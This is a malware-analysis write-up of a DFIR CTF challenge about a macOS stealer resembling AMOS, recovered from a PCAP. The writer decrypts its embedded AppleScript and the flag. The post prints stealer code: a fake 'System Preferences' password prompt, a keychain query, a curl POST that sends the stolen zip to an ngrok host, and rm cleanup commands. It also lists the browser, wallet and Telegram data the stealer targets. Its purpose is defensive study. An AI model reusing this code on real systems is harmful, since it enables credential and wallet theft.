---
title: Lobster Stealer - Malware Analysis
date: 2025-02-06
draft: false
description: Malware analysis of a CTF version AMOS stealer posted on DFIR LABS Github
summary: Malware analysis of the CTF version AMOS stealer
tags: ["malware analysis","DFIR Labs"]
categories: ["malware analysis"]
---

  

  

This is a writeup on [Famous AMOS](https://github.com/Azr43lKn1ght/DFIR-LABS/tree/main/Famous%20AMOS) CTF challenge. For this challenge we are given the description as follow:

  

> Cortex XDR has been flagging alerts non-stop this Friday due to a suspicious file being downloaded by Zhu Yuan. Thankfully, my Wireshark was running so we managed to track down some of the malicious activity. It seems like the user received a malicious attachment from an unknown domain via email, and executed it in their machine.

  

## Challenge File Analysis

### PCAP analysis

The challenge file given is a PCAP and we can see that there's multiple attachment that can be extracted from the PCAP by looking at the received packets.

![](https://i.imgur.com/B1DdSwU.png)

  

Let's export out all the objects.

![](https://i.imgur.com/vdR5rgj.png)

  

---

### PCAP Objects analysis

#### BetaTest.pdf

![](https://i.imgur.com/d3NmP6Z.png)

  

The Game Downloader is the `LegitLobsterGameDownloader.dmg` and the Special Gift is `bangboo.png`.

  

#### Bangboo.png

An image of Safety bangboo

  

![](https://i.imgur.com/xrCtPox.png)

  

#### Joinsystem (103kb)

![](https://i.imgur.com/rYRk4tk.png)

  
  

```plaintext

{"files":["/home/kali/Desktop/lobsterman/joinsystem/out.zip"],"message":"Files uploaded successfully"}

```

  

#### Out.zip (766kb)

![](https://i.imgur.com/La6HvnQ.png)

  

This seems to be a compressed file named `out.zip` due to the magic-byte `PK`, which we can decompress and investigate on the content.

  

####  LegitLobsterGameDownloader.dmg

It is an Apple Disk Image File, which we can decompress later to further investigate on the content inside.

  

![](https://i.imgur.com/99EnUmM.png)

  

---

  

## Analysis on Out.zip

```plaintext

Out.zip/

├── tmp/

│   └── 3089/

│       ├── File Grabber/

│       │   └── BetaTest.pdf

│       ├── info

│       ├── keychain

│       ├── pwd

│       └── username

└── flag.enc

```

  

**BetaTest.pdf**: The same pdf attachment found in the PCAP

  

**info**: Information about the machine hardware `Vendor ID: 0x15ad Yes: 24-Bit Color (ARGB8888)F2C3870AB6fd715126e33f59ae7]Welcome to the Virtual Machine`

  

**keychain**: OSX Keychain file

  

**pwd**: `macos`

  

**username**: `macos`

  

**flag.enc**: The encrypted flag

  

---

  

## Analysis on LegitLobsterGameDownloader.dmg

```plaintext

LegitLobsterGame/

└── lobsterstealer

```

  

**lobsterstealer**: MacOS binary

![](https://i.imgur.com/TFycKZn.png)

  

Using IDA, we can decompile the code. In the `main` function, we observe a long hexadecimal value and a shorter hexadecimal value being defined. These values are then passed as inputs to the `rc4_decrypt` function to retrieve the original value.

  

![](https://i.imgur.com/GUIIBUQ.png)

  

### RC4 Decrypt

To decrypt the original data, we have to extract the long hexadecimal value at `aA37c59750ed63b` and clean it up using [CyberChef](http://gchq.github.io/CyberChef/#recipe=Regular_expression('User%20defined','%5C'.*%5C'',true,true,false,false,false,false,'List%20matches')Find_/_Replace(%7B'option':'Regex','string':'%5C''%7D,'',true,false,true,false)Remove_whitespace(true,true,true,true,true,false)&oenc=65001&ieol=CRLF) to be used.

  

*There should be better way to do this, but here's how I did it*

  

![](https://i.imgur.com/eImgR1o.png)

  

After that I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=Regular_expression('User%20defined','%5C'.*%5C'',true,true,false,false,false,false,'List%20matches')Find_/_Replace(%7B'option':'Regex','string':'%5C''%7D,'',true,false,true,false)Remove_whitespace(true,true,true,true,true,false)&oenc=65001&ieol=CRLF) to decrypt the encrypted data and the original malicious OSA Script can be found.

  

![](https://i.imgur.com/8vrj8v5.png)

  

### Encrypt Flag function

Upon analyzing the malicious OSA script, the `encryptFlag` function appears to be responsible for encrypting the flag. At the end of the script, the input files and the output file used for the encryption process can be found.

  

```osascript

on encryptFlag(sussyfile, inputFile, outputFile)

    set hexKey to (do shell script "md5 -q " & sussyfile)

    set hexIV to (do shell script "echo \"" & hexKey & "\" | rev")

    do shell script "openssl enc -aes-128-cbc -in " & quoted form of inputFile & " -out " & quoted form of outputFile & " -K " & hexKey & " -iv " & hexIV

end encryptFlag

  

set sussyfile to "~/Downloads/bangboo.png"

set inputFile to "/tmp/flag.png"

set outputFile to "/tmp/flag.enc"

  

encryptFlag(sussyfile, inputFile, outputFile)

do shell script "cd /tmp && zip -r out.zip " & writemind & " flag.enc"

send_data(0)

do shell script "rm -r " & writemind

do shell script "rm /tmp/out.zip"

do shell script "rm /tmp/flag.enc"

```

  

The encryptFlag function accept in 3 arguments `sussyfile, inputfile and outputfile`.

  

From the variable defined, we know that the `sussyfile` is set to `bangboo.png`, the image found in the PCAP earlier.

  

The output file `flag.enc` can also be found inside the `Out.zip`.

  

**Encryption method** = `AES-128-CBC`

  

**key** = MD5 of `bangboo.png`

  

**IV** = reverse MD5 of `bangboo.png`

  

With that we can use [CyberChef](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'3b45875108efb349430780d0afd6730a'%7D,%7B'option':'Hex','string':'a0376dfa0d087034943bfe80157854b3'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Render_Image('Raw')&oeol=CR) to decrypt the encrypted flag and obtain the original flag.

1. Key (MD5 hash of `bangboo.png`)

2. IV (Reverse MD5 hash of `bangboo.png`)

![](https://i.imgur.com/le7bXRt.png)

  

### Malicious OSA Script

#### 1. Initialization and Setup
- A random directory is created in `/tmp/` (e.g., `/tmp/<randomNumber>/`) to store collected data.
- The variable `writemind` holds the path to this temporary directory.

#### 2. System Information Collection
- The script collects system information (e.g., software, hardware, and display details) using the `system_profiler` command.
- This information is saved to a file named `info` in the `writemind` directory.

#### 3. Password Retrieval
- The script attempts to retrieve the user's password:
    - If the password is cached, it retrieves it silently.
    - If not, it prompts the user with a dialog box asking for their password.
    - The entered password is saved to a file named `pwd` in the `writemind` directory.
*The collected password can then be used to decrypt the OSX Keychain *

```plaintext
on getpwd(username, writemind)

    try

        if checkvalid(username, "") then

            set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""

            writeText(result as string, writemind & "masterpass-chrome")

        else

            repeat

                set result to display dialog "Required Application Helper.\nPlease enter password for continue." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer

                set password_entered to text returned of result

                if checkvalid(username, password_entered) then

                    writeText(password_entered, writemind & "pwd")

                    return password_entered

                end if

            end repeat

        end if

    end try

    return ""

end getpwd
```
#### 4. File and Data Collection
**a. Browser Data Collection**
- **Chromium-Based Browsers** :
    - The script iterates over a list of Chromium-based browsers (e.g., Chrome, Brave, Edge, Opera, etc.) and collects sensitive files such as:
        - Cookies
        - Login Data
        - Web Data
        - IndexedDB
        - Local Extension Settings
    - It uses the `grabPlugins` function to handle IndexedDB and Local Extension Settings for specific plugins.
- **Firefox-Based Browsers** :
    - The script collects data from Firefox, Waterfox, and Pale Moon profiles, including:
        - Cookies
        - Form history
        - Key database (`key4.db`)
        - Login data (`logins.json`)
    - This data is saved in a subdirectory named `ff/`.

**b. Wallet Data Collection**
- **Desktop Wallets** :
    - The script collects data from various cryptocurrency wallets, including:
        - Electrum
        - Coinomi
        - Exodus
        - Atomic
        - Wasabi
        - Ledger Live
        - Monero
        - Bitcoin Core
        - Litecoin Core
        - Dash Core
        - Trezor Suite
    - Wallet data is saved in a subdirectory named `deskwallets/`.
 
**c. Telegram Data Collection**
- **Telegram Desktop** :
    - The script collects data from the Telegram Desktop application, specifically targeting the `tdata/` directory, which contains chat history and other sensitive information.
    - This data is saved in a subdirectory named `Telegram Data/`.

 **d. File Grabber**
- **FileGrabber Functionality** :
    - The script searches for files with specific extensions (e.g., `.pdf`, `.docx`, `.wallet`, `.keys`) in the user's Desktop, Documents, and Downloads folders.
    - Files are copied to a subdirectory named `FileGrabber/` if their total size does not exceed 10 MB.
    - Additional files like Safari cookies (`Cookies.binarycookies`) and Apple Notes data (`NoteStore.sqlite`) are also collected.

####  5. Keychain and Notes Data
- **Keychain Access** :
    - The script copies the macOS login keychain (`login.keychain-db`) to the `writemind` directory.
- **Apple Notes** :
    - The script collects Apple Notes data (`NoteStore.sqlite` and related files) and saves them in the `FileGrabber/` directory.

#### 6. Sending Collected Data
- **Sending Data to C2** :
    - The script attempts to send the collected data to a remote server using an HTTP POST request via `curl`.
    - The data is sent as a ZIP file (`out.zip`) containing all the collected files.
    - If the transmission fails, the script retries up to 40 times with a delay of 3 seconds between attempts.

```
on send_data(attempt)

    try

        set result_send to do shell script "curl -X POST -H \"user: 85JDXWQ4CL67-XaZnPqOLmHFv1yNRXZOmNTpeJMw4AP=\" -H \"BuildID: /xpLmzYqPrVH-jKOpfmncviXt2zDgp/-NFM7tQhb6tp=\" --max-time 300 --retry 5 --retry-delay 10 -F \"file1=@/tmp/out.zip\" http://b2eb-115-135-31-192.ngrok-free.app/joinsystem"

    on error

        if attempt < 40 then

            delay 3

            send_data(attempt + 1)

        end if

    end try

end send_data
```
#### 7. Cleanup
- **Temporary Files Removal** :
    - After the data is sent, the script performs cleanup by:
        - Deleting the temporary directory (`writemind`).
        - Removing the ZIP file (`out.zip`) and encrypted flag file (`flag.enc`) from `/tmp/`.


Shoutout to the author of this challenge: 
- [warlocksmurf](https://warlocksmurf.github.io/)